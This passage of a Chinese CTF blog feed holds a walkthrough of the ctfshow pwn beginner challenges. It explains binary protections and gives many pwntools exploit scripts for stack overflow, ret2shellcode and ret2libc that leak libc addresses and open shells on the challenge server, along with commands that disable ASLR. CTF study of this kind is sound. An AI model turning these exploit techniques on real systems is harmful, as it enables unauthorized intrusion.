c)，在参数str所指向的字符串中搜索第一次出现字符c的位置。</p><h1 id="pthread-create"><a href="#pthread-create" class="headerlink" title="pthread_create"></a>pthread_create</h1><p>格式：int pthread_create(pthread_t *thread,const pthread_attr_t *attr,void *( *start_routine)(void *),void <em>arg)，thread为线程标识符，attr为线程属性，</em>( *start_routine)(void *)线程启动函数，arg为传递给启动函数的参数，如果创建成功，则返回0，反之返回错误码如：EAGAIN，EINVAL，EPERM。</p><h1 id="pthread-join"><a href="#pthread-join" class="headerlink" title="pthread_join"></a>pthread_join</h1><p>格式：int pthread_join(pthread_t thread,void **retval)，thread为要等待的线程，retval为接收到的返回值，该函数允许一个线程等待另一个线程的结束。</p>]]>
    </content>
    <id>http://example.com/2025/09/15/%E5%87%BD%E6%95%B0-C/</id>
    <link href="http://example.com/2025/09/15/%E5%87%BD%E6%95%B0-C/"/>
    <published>2025-09-15T11:32:55.586Z</published>
    <summary>
      <![CDATA[<h1 id="strtol"><a href="#strtol" class="headerlink" title="strtol()"></a>strtol()</h1><p>格式：<em>*long int strol(const char *str,char endptr]]>
    </summary>
    <title>函数_C</title>
    <updated>2025-11-24T14:24:13.966Z</updated>
  </entry>
  <entry>
    <author>
      <name>haoo</name>
    </author>
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    <content>
      <![CDATA[<h1 id="Test-your-nc"><a href="#Test-your-nc" class="headerlink" title="Test_your_nc"></a>Test_your_nc</h1><h2 id="pwn0"><a href="#pwn0" class="headerlink" title="pwn0"></a>pwn0</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn0.png"></p><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn1_1.png"></p><p>发现nc连接后可以直接获得flag。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn1_2.png"></p><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn2_1.png"></p><p>发现直接给了我们shell，只需要nc连接后并执行cat &#x2F;ctfshow_flag命令即可获得flag。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn2_2.png"></p><h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn3_1.png"></p><p>程序本身很简单，就是找到哪个函数能够获得flag。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn3_2.png"></p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn3_4.png"></p><p>直接选6即可获得flag。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn3_3.png"></p><p>但是在这里有一个迷惑选项4，就是echo &#x2F;ctfshow_flag命令。</p><p><strong>echo命令：是Linux系统中的一个基础命令，用于在终端输出文本或变量值，常用于脚本中显示信息、调试或生成文件。常用选项：-n 不换行；-e 启用转义字符解释。高级用法：使用重定向将输出保存到文件，如echo “aaaa” &gt; output.txt；追加内容到文件，如echo “aaaa” &gt;&gt; output.txt。</strong></p><p>因此当选择选项4时，并不会获得flag，而将打印出ctfshow_flag。</p><h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn4_1.png"></p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn4_2.png"></p><p>该程序将用户输入的字符串与原先已设定好的字符串进行比较，若相同，则调用execve函数获得shell。（具体用法在ret2syscall）</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn4_3.png"></p><h1 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h1><h2 id="pwn5-pwn12"><a href="#pwn5-pwn12" class="headerlink" title="pwn5-pwn12"></a>pwn5-pwn12</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">section .data<br>    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0<br><br>section .text<br>    global _start<br><br>_start:<br><br>; 立即寻址方式<br>    mov eax, 11         ; 将11赋值给eax<br>    add eax, 114504     ; eax加上114504<br>    sub eax, 1          ; eax减去1<br><br>; 寄存器寻址方式<br>    mov ebx, 0x36d      ; 将0x36d赋值给ebx<br>    mov edx, ebx        ; 将ebx的值赋值给edx<br><br>; 直接寻址方式<br>    mov ecx, msg      ; 将msg的地址赋值给ecx<br><br>; 寄存器间接寻址方式<br>    mov esi, msg        ; 将msg的地址赋值给esi<br>    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax<br><br>; 寄存器相对寻址方式<br>    mov ecx, msg        ; 将msg的地址赋值给ecx<br>    add ecx, 4          ; 将ecx加上4<br>    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax<br><br>; 基址变址寻址方式<br>    mov ecx, msg        ; 将msg的地址赋值给ecx<br>    mov edx, 2          ; 将2赋值给edx<br>    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax<br><br>; 相对基址变址寻址方式<br>    mov ecx, msg        ; 将msg的地址赋值给ecx<br>    mov edx, 1          ; 将1赋值给edx<br>    add ecx, 8          ; 将ecx加上8<br>    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax<br><br>; 输出字符串<br>    mov eax, 4          ; 系统调用号4代表输出字符串<br>    mov ebx, 1          ; 文件描述符1代表标准输出<br>    mov ecx, msg        ; 要输出的字符串的地址<br>    mov edx, 22         ; 要输出的字符串的长度<br>    int 0x80            ; 调用系统调用<br><br>; 退出程序<br>    mov eax, 1          ; 系统调用号1代表退出程序<br>    xor ebx, ebx        ; 返回值为0<br>    int 0x80            ; 调用系统调用<br><br></code></pre></td></tr></table></figure><p>这部分给了我们一个.asm文件以及一个与其对应的可执行文件，该部分主要让我们了解一些寄存器、寻址方式。</p><p><strong>.asm文件：为汇编语言的源代码文件，常用于描述CPU的低级操作指令，它是机器指令的文本形式，直接与硬件交互。.asm文件通常用NASM汇编器编写，由于NASM汇编器与GCC工具链不是直接集成的，因此处理需要经过以下步骤：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">nasm -f elf xxx.asm    #生成一个xxx.o文件<br>ld -m elf_i386 -s -o xxx xxx.o    #将xxx.o文件链接成可执行文件<br></code></pre></td></tr></table></figure><h2 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h2><p>这题主要考察gcc的一个使用</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn13.png"></p><h2 id="pwn14"><a href="#pwn14" class="headerlink" title="pwn14"></a>pwn14</h2><p>这题给了我们一个.c文件，主要是将二进制文件内容转换成二进制字符串形式，并以特点格式输出。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn14.png"></p><p>需要先创建一个以key命名的文本文件，并在其里面写入CTFshow。</p><h2 id="pwn15"><a href="#pwn15" class="headerlink" title="pwn15"></a>pwn15</h2><p>这题主要考察如何将.asm文件变为可执行文件。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn15.png"></p><p><strong>这里需要注意的是操作系统不一样，编译与链接命令也不一样</strong>。</p><h2 id="pwn16"><a href="#pwn16" class="headerlink" title="pwn16"></a>pwn16</h2><p>这题主要考察如何将.s文件变为可执行文件。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn16.png"></p><p>其实.s文件与.asm文件都是汇编语言源代码文件，其核心区别在于语法和配套的汇编器。.s文件的默认汇编器为as，语法风格为AT&amp;T语法，而.asm文件的默认汇编器为nasm、MASM、FASM，语法风格为Intel语法</p><h2 id="pwn17"><a href="#pwn17" class="headerlink" title="pwn17"></a>pwn17</h2><p><img src="/iamges/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn17_1.png"></p><p>该题是一道简单的菜单题，主要考察了我们Linux系统的一些指令使用。此题的话主要看2，3选项，其他的选项没有实质性的意义。</p><p>选项3最后会执行system(“cat &#x2F;ctfshow_flag”)并获得flag，但问题是期间会sleep很久，又由于远程环境时间有限，因此不选该选项。</p><p>选项2限制用户输入不超过10字节的字符串，并执行该字符串，因此我们可以直接输入&#x2F;bin&#x2F;sh获得shell，或者使用通配符*直接获取flag。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn17_2.png"></p><h2 id="pwn18"><a href="#pwn18" class="headerlink" title="pwn18"></a>pwn18</h2><p>这题主要考察了对echo指令的了解</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn18_1.png"></p><p>主要是让我们判断哪一个是真的能获取到flag，有两个函数，一个是fake函数，一个是real函数。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn18_2.png"></p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn18_3.png"></p><p>对于echo指令，&gt;表示的是将前面的内容替换文件中的内容并保存起来，&gt;&gt;表示的是将前面的内容追加到文件中内容的后面并保存起来。</p><p>因此若选择real函数，那么flag is here将会代替&#x2F;ctfshow_flag文件中原有的内容，即flag，最后得到的就是flag is here；若选择fake函数，那么flag is here将会追加到&#x2F;ctfshow_flag文件中原有内容的后面，即flag后面加上flag is here，最后去掉flag is here就是flag。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn18_4.png"></p><h2 id="pwn19"><a href="#pwn19" class="headerlink" title="pwn19"></a>pwn19</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn19_1.png"></p><p>该题使用了fclose()关闭文件输出流，接着让用户输入一串字符串，再执行该字符串。本题的难点在于关闭了输出流，那么无法标准输出，就需要进行输出重定向，将标准输出重定向到标准输入。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn19_2.png"></p><h2 id="pwn20-pwn22"><a href="#pwn20-pwn22" class="headerlink" title="pwn20-pwn22"></a>pwn20-pwn22</h2><p>该题主要考察对<strong>RELRO保护</strong>的了解，其主要是通过限 制和保护**全局偏移表（GOT）<strong>和</strong>过程链接表（PLT）**的可写性来防止针对这些结构的攻击。</p><p>该保护有三种状态：<strong>No RELRO，GOT和PLT均可写；Partial RELRO，GOT开头部分为只读，剩余部分仍可写；Full RELRO，GOT和PLT均为只读</strong>。</p><h2 id="pwn23"><a href="#pwn23" class="headerlink" title="pwn23"></a>pwn23</h2><p>简单的一道溢出题目，使用ssh连接后运行程序造成溢出即可获得flag</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn23.png"></p><h2 id="pwn24"><a href="#pwn24" class="headerlink" title="pwn24"></a>pwn24</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn24_1.png"></p><p>该题没有开启NX保护且没有沙盒保护，因此可以直接打ret2shellcode，这里使用shellcraft模块编写shellcode更加方便。</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn24_2.png"></p><p>该题主要研究ctfshow函数，由于该函数无法跟进，就只能看汇编。首先调用__x86_get_pc_thunk_bx函数，将当前指令指针的值保存到ebx中，接着调用read函数，将输入的东西保存到缓冲区，然后再打印出来，最后执行缓冲区中存储的代码。</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>io=remote(<span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="hljs-number">28303</span>)<br><br>shellcode=asm(shellcraft.sh())<br>io.sendline(shellcode)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn24_3.png"></p><h2 id="pwn25"><a href="#pwn25" class="headerlink" title="pwn25"></a>pwn25</h2><p>一道简单的ret2libc，使用write泄漏libc基址。</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>elf=ELF(<span class="hljs-string">&#x27;./pwn25&#x27;</span>)<br>io=remote(<span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="hljs-number">28165</span>)<br><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload1=cyclic(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>io.sendline(payload1)<br><br>write=u32(io.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload2=cyclic(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system)+p32(main)+p32(bin_sh)<br>io.sendline(payload2)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><p>这里使用的是LibcSearcher查找libc版本，当然若给了相应libc版本的文件，可以直接导入。</p><h2 id="pwn26"><a href="#pwn26" class="headerlink" title="pwn26"></a>pwn26</h2><p>该题主要考察ASLR保护参数值的设置。使用下述指令将ASLR参数改为0，获得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">echo 0 &gt; /proc/sys/kernel/randomize_va_space<br></code></pre></td></tr></table></figure><p>ASLR保护即地址空间布局随机化（Address Space Layout Randomization），在Linux下通过&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space文件配置。ASLR工作主要有三个层次：0-完全关闭ASLR保护；1-部分随机化（栈的基地址、共享库的加载基地址、mmap基地址）2-完全随机化（包含1的所有随机化、随机化堆的基地址等等）。</p><h2 id="pwn27"><a href="#pwn27" class="headerlink" title="pwn27"></a>pwn27</h2><p>使用下述指令将ASLR参数改为0或1，获得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">echo 0 &gt; /proc/sys/kernel/randomize_va_space<br>echo 1 &gt; /proc/sys/kernel/randomize_va_space<br></code></pre></td></tr></table></figure><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn27.png"></p><h2 id="pwn28"><a href="#pwn28" class="headerlink" title="pwn28"></a>pwn28</h2><p>使用下述指令将ASLR参数改为0或1或2，获得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">echo 0 &gt; /proc/sys/kernel/randomize_va_space<br>echo 1 &gt; /proc/sys/kernel/randomize_va_space<br>echo 2 &gt; /proc/sys/kernel/randomize_va_space<br></code></pre></td></tr></table></figure><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn28.png"></p><h2 id="pwn29"><a href="#pwn29" class="headerlink" title="pwn29"></a>pwn29</h2><p>该题就是感受一下ASLR与PIE同时开启后的地址是什么样的，但是随机的都仅仅是某个对象的起始地址，内部结构没变，也就是相对偏移不会变，因此在后续遇到开启了PIE保护的题目，就得先找到基址，然后通过相对偏移算出所需地址即可。</p><h2 id="pwn30"><a href="#pwn30" class="headerlink" title="pwn30"></a>pwn30</h2><p>也是一道ret2libc的题目</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br>elf=ELF(<span class="hljs-string">&#x27;./pwn30&#x27;</span>)<br>io=remote(<span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="hljs-number">28232</span>)<br><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload1=cyclic(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br>io.sendline(payload1)<br><br>write=u32(io.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write)<br>libc_base=write-libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system=libc_base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh=libc_base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload2=cyclic(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system)+p32(main)+p32(bin_sh)<br>io.sendline(payload2)<br><br>io.interactive()<br><br><br></code></pre></td></tr></table></figure><h2 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h2><p>一道开启了PIE保护的题目</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn31_1.png"></p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn31_2.png"></p><p>题目直接给了我们main函数的地址，可以接收该地址，接着可以算出基址，然后就没什么难点了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>from LibcSearcher import*<br>context.log_level=&#x27;debug&#x27;<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28311)<br>elf=ELF(&#x27;./pwn31&#x27;)<br><br>main=int(io.recvline(),16)<br>print(hex(main))<br><br>addr_base=main-elf.sym[&#x27;main&#x27;]<br>write_plt=addr_base+elf.sym[&#x27;write&#x27;]<br>write_got=addr_base+elf.got[&#x27;write&#x27;]<br>ctfshow=addr_base+elf.sym[&#x27;ctfshow&#x27;]<br>ebx=addr_base+0x1fc0<br><br>payload1=b&#x27;a&#x27;*132+p32(ebx)+b&#x27;aaaa&#x27;+p32(write_plt)+p32(ctfshow)+p32(1)+p32(write_got)+p32(4)<br>io.sendline(payload1)<br><br>write=u32(io.recv(4))<br>print(hex(write))<br>libc=LibcSearcher(&#x27;write&#x27;,write)<br>libc_base=write-libc.dump(&#x27;write&#x27;)<br>system=libc_base+libc.dump(&#x27;system&#x27;)<br>bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)<br><br>payload2=cyclic(0x88+4)+p32(system)+p32(ctfshow)+p32(bin_sh)<br>io.sendline(payload2)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn32-pwn34"><a href="#pwn32-pwn34" class="headerlink" title="pwn32-pwn34"></a>pwn32-pwn34</h2><p>这三道题主要介绍了<strong>FORTIFY_SOURCE保护机制，旨在防止缓冲区溢出和其它与字符串和内存操作相关的安全漏洞，其是在编译时自动插入一组额外代码，用于增强程序对于缓冲区溢出和其他常见安全问题的防护。FORTIFY_SOURCE主要有：运行时长度检查、缓冲区溢出检测、安全警告和错误报告。不同的级别，开启的保护机制是不一样的。</strong></p><h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="pwn35"><a href="#pwn35" class="headerlink" title="pwn35"></a>pwn35</h2><p>一个简单的栈溢出，直接输入大量字符串造成溢出使得程序崩溃，并打印出flag</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn35.png"></p><p>这里主要是因为signal函数，当收到信号11（SIGSEGV）时就会去执行后面那个函数即打印出flag。</p><h2 id="pwn36"><a href="#pwn36" class="headerlink" title="pwn36"></a>pwn36</h2><p>简单的32位栈溢出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28231)<br><br>backdoor=0x8048586<br>payload=cyclic(0x28+4)+p32(backdoor)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn37"><a href="#pwn37" class="headerlink" title="pwn37"></a>pwn37</h2><p>简单的32位栈溢出，给了shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28150)<br><br>backdoor=0x8048521<br>payload=cyclic(0x12+4)+p32(backdoor)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn38"><a href="#pwn38" class="headerlink" title="pwn38"></a>pwn38</h2><p>简单的64位栈溢出，给了shell，但是得注意堆栈平衡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.log_level=&#x27;debug&#x27;<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28230)<br><br>ret=0x0400287<br>backdoor=0x400657<br><br>payload=b&#x27;a&#x27;*(0xA+8)+p64(ret)+p64(backdoor)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn39"><a href="#pwn39" class="headerlink" title="pwn39"></a>pwn39</h2><p>简单的32位栈溢出，这次将system函数和&#x2F;bin&#x2F;sh字符串分开了，需要构造一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn39&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28229)<br><br>system=elf.sym[&#x27;system&#x27;]<br>bin_sh=0x08048750<br><br>payload=cyclic(0x12+4)+p32(system)+p32(0)+p32(bin_sh)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn40"><a href="#pwn40" class="headerlink" title="pwn40"></a>pwn40</h2><p>简单的64位栈溢出，依旧是将system函数和&#x2F;bin&#x2F;sh字符串分开了，64位的传参方式是先rdi、rsi、rdx、rcx、r8、r9这几个寄存器，然后才是栈，因此脚本会有所不同</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>context.arch=&#x27;amd64&#x27;<br>elf=ELF(&#x27;./pwn40&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28249)<br><br>bin_sh=0x0400808<br>system=elf.sym[&#x27;system&#x27;]<br>ret=0x04004fe<br>rdi=0x04007e3<br><br>payload=cyclic(0xA+8)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn41"><a href="#pwn41" class="headerlink" title="pwn41"></a>pwn41</h2><p>简单的32位栈溢出，这次不是&#x2F;bin&#x2F;sh字符串了，是sh字符串了</p><p><strong>system(‘&#x2F;bin&#x2F;sh’)是直接指定了系统默认的shell程序路径来执行命令，而system(‘sh’)则依赖系统的环境变量$PATH来查找sh可执行文件并执行，如果系统的环境变量设置正确，这两种是一样的</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn41&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28312)<br><br>sh=0x080487BA<br>system=elf.sym[&#x27;system&#x27;]<br><br>payload=cyclic(0x12+4)+p32(system)+p32(0)+p32(sh)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn42"><a href="#pwn42" class="headerlink" title="pwn42"></a>pwn42</h2><p>简单的64位栈溢出，跟pwn41一样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn42&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28121)<br><br>rdi=0x0400843<br>ret=0x040053e<br>sh=0x0400872<br>system=elf.sym[&#x27;system&#x27;]<br><br>payload=cyclic(0xA+8)+p64(ret)+p64(rdi)+p64(sh)+p64(system)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn43"><a href="#pwn43" class="headerlink" title="pwn43"></a>pwn43</h2><p>简单的32位栈溢出，这次只有system函数，没有如&#x2F;bin&#x2F;sh和sh的字符串了，因此需要重新构造脚本</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn43_1.png"></p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn43_2.png"></p><p>存在栈溢出，在bss段上存在buf2这么一个变量，因此可以在此处输入&#x2F;bin&#x2F;sh字符串，再构造system(‘&#x2F;bin&#x2F;sh’)从而获取shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn43&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28281)<br><br>bss=0x0804B060<br>gets=elf.sym[&#x27;gets&#x27;]<br>system=elf.sym[&#x27;system&#x27;]<br>main=elf.sym[&#x27;main&#x27;]<br><br>payload1=cyclic(0x6C+4)+p32(gets)+p32(main)+p32(bss)<br>io.sendline(payload1)<br><br>payload2=cyclic(0x6C+4)+p32(system)+p32(0)+p32(bss)<br><br>io.sendline(b&#x27;/bin/sh\x00&#x27;)<br>io.sendline(payload2)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn44"><a href="#pwn44" class="headerlink" title="pwn44"></a>pwn44</h2><p>简单的64位栈溢出，和pwn43一样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn44&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28125)<br><br>main=elf.sym[&#x27;main&#x27;]<br>system=elf.sym[&#x27;system&#x27;]<br>gets=elf.sym[&#x27;gets&#x27;]<br>bss=0x0602080<br>rdi=0x04007f3<br>ret=0x04004fe<br><br>payload1=cyclic(0xA+8)+p64(rdi)+p64(bss)+p64(gets)+p64(main)<br>io.sendline(payload1)<br><br>payload2=cyclic(0xA+8)+p64(ret)+p64(rdi)+p64(bss)+p64(system)<br>io.sendline(b&#x27;/bin/sh&#x27;)<br>io.sendline(payload2)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn45"><a href="#pwn45" class="headerlink" title="pwn45"></a>pwn45</h2><p>简单的32位ret2libc，通过write泄漏libc基址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>from LibcSearcher import*<br>elf=ELF(&#x27;./pwn45&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28302)<br><br>write_plt=elf.plt[&#x27;write&#x27;]<br>write_got=elf.got[&#x27;write&#x27;]<br>main=elf.sym[&#x27;main&#x27;]<br><br>payload=cyclic(0x6B+4)+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)<br>io.sendline(payload)<br><br>write=u32(io.recvuntil(&#x27;\xf7&#x27;)[-4:])<br>print(hex(write))<br><br>libc=LibcSearcher(&#x27;write&#x27;,write)<br>libc_base=write-libc.dump(&#x27;write&#x27;)<br>system=libc_base+libc.dump(&#x27;system&#x27;)<br>bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)<br><br>payload=cyclic(0x6B+4)+p32(system)+p32(main)+p32(bin_sh)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn46"><a href="#pwn46" class="headerlink" title="pwn46"></a>pwn46</h2><p>简单的64位ret2libc，通过write泄漏libc基址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>from LibcSearcher import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28281)<br>elf=ELF(&#x27;./pwn46&#x27;)<br><br>write_plt=elf.plt[&#x27;write&#x27;]<br>write_got=elf.got[&#x27;write&#x27;]<br>main=elf.sym[&#x27;main&#x27;]<br>rdi=0x0400803<br>rsi_r15=0x0400801<br>ret=0x04004fe<br><br>payload=cyclic(0x70+8)+p64(rdi)+p64(1)+p64(rsi_r15)+p64(write_got)+p64(8)+p64(write_plt)+p64(main)<br>io.sendline(payload)<br><br>write=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(write))<br><br>libc=LibcSearcher(&#x27;write&#x27;,write)<br>libc_base=write-libc.dump(&#x27;write&#x27;)<br>system=libc_base+libc.dump(&#x27;system&#x27;)<br>bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)<br><br>payload=cyclic(0x70+8)+p64(rdi)+p64(bin_sh)+p64(system)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn47"><a href="#pwn47" class="headerlink" title="pwn47"></a>pwn47</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn47.png"></p><p>一道简单的32位ret2libc，直接给了函数地址与&#x2F;bin&#x2F;sh字符串地址，因此可以直接泄漏libc基址并获取shell。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs 